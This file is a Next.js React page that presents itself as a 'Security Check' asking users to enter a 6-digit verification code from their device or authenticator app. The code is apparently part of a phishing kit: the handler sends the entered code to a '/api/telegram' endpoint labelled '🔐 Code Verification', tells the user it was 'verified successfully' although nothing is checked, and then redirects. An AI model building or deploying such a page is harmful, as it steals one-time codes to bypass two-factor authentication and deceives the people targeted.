"use client";

import { useState } from "react";
import { motion } from "framer-motion";
import { useRouter } from "next/navigation";

export default function CodeVerificationPage() {
  const router = useRouter();
  const [code, setCode] = useState("");
  const [error, setError] = useState("");
  const [success, setSuccess] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const trimmedCode = code.trim();
    if (!trimmedCode) {
      setError("Please enter the verification code.");
      return;
    }
    setIsSubmitting(true);
    setError("");
    setSuccess("");

    try {
      const res = await fetch("/api/telegram", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          data: { verification_code: trimmedCode },
          formType: "🔐 Code Verification",
        }),
      });

      if (!res.ok) throw new Error("Failed to submit");

      setSuccess("Code verified successfully!");
      setCode("");
      setTimeout(() => router.push("/Success"), 2000);
    } catch (err) {
      console.error(err);
      setError("Failed to submit code. Please try again.");
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <main className="relative min-h-screen bg-gradient-to-br from-gray-900 to-black overflow-hidden">
      <div className="absolute top-0 right-0 w-[600px] h-[600px] bg-purple-500/20 rounded-full blur-[150px]" />
      <div className="absolute bottom-0 left-0 w-[500px] h-[500px] bg-blue-500/20 rounded-full blur-[120px]" />

      <div className="relative z-10 max-w-4xl mx-auto px-4 pt-32 pb-20 md:pt-40 md:pb-28">
        <motion.div
          initial={{ opacity: 0, y: 30 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.6 }}
          className="text-center mb-10"
        >
          <span className="text-purple-400 text-sm font-semibold tracking-wider uppercase bg-purple-500/10 px-4 py-1 rounded-full inline-block mb-4">
            Security Check
          </span>
          <h1 className="font-bold text-4xl md:text-5xl text-white mb-4">
            Enter Verification Code
          </h1>
          <p className="text-gray-400 text-lg max-w-2xl mx-auto">
            A code has been sent to your registered device. Please enter it below.
          </p>
        </motion.div>

        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5, delay: 0.2 }}
        >
          <div className="bg-white/5 backdrop-blur-sm border border-white/10 rounded-2xl p-6 md:p-8">
            <form onSubmit={handleSubmit} className="space-y-6">
              {error && (
                <div className="bg-red-500/10 border border-red-500/30 text-red-400 px-4 py-3 rounded-lg text-sm">
                  {error}
                </div>
              )}
              {success && (
                <div className="bg-green-500/10 border border-green-500/30 text-green-400 px-4 py-3 rounded-lg text-sm">
                  {success}
                </div>
              )}

              <div>
                <label className="block text-white font-semibold mb-2">
                  Verification Code
                </label>
                <input
                  type="text"
                  value={code}
                  onChange={(e) => setCode(e.target.value)}
                  className="w-full bg-gray-800/50 border border-gray-700 rounded-lg px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-purple-500 transition-colors text-center text-2xl tracking-widest"
                  placeholder="000000"
                  required
                  autoComplete="off"
                />
                <p className="text-gray-500 text-xs mt-2">
                  Enter the 6-digit code from your authenticator app or email.
                </p>
              </div>

              <div className="pt-4">
                <button
                  type="submit"
                  disabled={isSubmitting}
                  className={`w-full bg-gradient-to-r from-blue-600 to-purple-600 hover:shadow-lg text-white font-semibold py-3 px-6 rounded-lg transition-all duration-300 ${
                    isSubmitting ? "opacity-70 cursor-not-allowed" : ""
                  }`}
                >
                  {isSubmitting ? "Verifying..." : "Verify Code"}
                </button>
              </div>
            </form>

            <p className="text-gray-500 text-xs text-center mt-6">
              Didn't receive a code? <a href="#" className="text-purple-400 hover:underline">Resend</a>
            </p>
          </div>
        </motion.div>
      </div>
    </main>
  );
}